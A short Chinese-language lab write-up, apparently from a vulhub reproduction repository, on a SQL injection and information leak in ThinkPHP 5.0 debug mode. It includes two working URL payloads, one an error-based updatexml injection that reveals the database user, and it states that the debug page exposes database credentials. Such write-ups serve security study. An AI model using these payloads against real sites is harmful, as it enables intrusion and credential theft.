# ThinkPHP5 SQL注入漏洞 && 敏感信息泄露

###### by ADummy

### 0x00利用路线

​			url直接注入--->有回显

### 0x01漏洞介绍

​			ThinkPHP是在中国使用极为广泛的PHP开发框架。在其版本5.0（<5.1.23）中,开启debug模式，传入的某参数在绑定编译指令的时候又没有安全处理，预编译的时候导致SQL异常报错。然而thinkphp5默认开启debug模式，在漏洞环境下构造错误的SQL语法会泄漏数据库账户和密码

### 0x02漏洞复现

#### payload：

http://your-ip/index.php?ids[]=1&ids[]=2

http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1



​			**执行payload1，显示出用户名，默认页面**

![ThinkPHP5_SQL注入_信息泄露_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ThinkPHP5_SQL注入_信息泄露_1.jpg)



​			**执行payload2，可以在调试页面找到数据库的账户和密码**

![ThinkPHP5_SQL注入_信息泄露漏洞_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/ThinkPHP5_SQL注入_信息泄露漏洞_2.png)

​				

​	

### 0x03参考资料

https://blog.csdn.net/qq_41832837/article/details/104066647
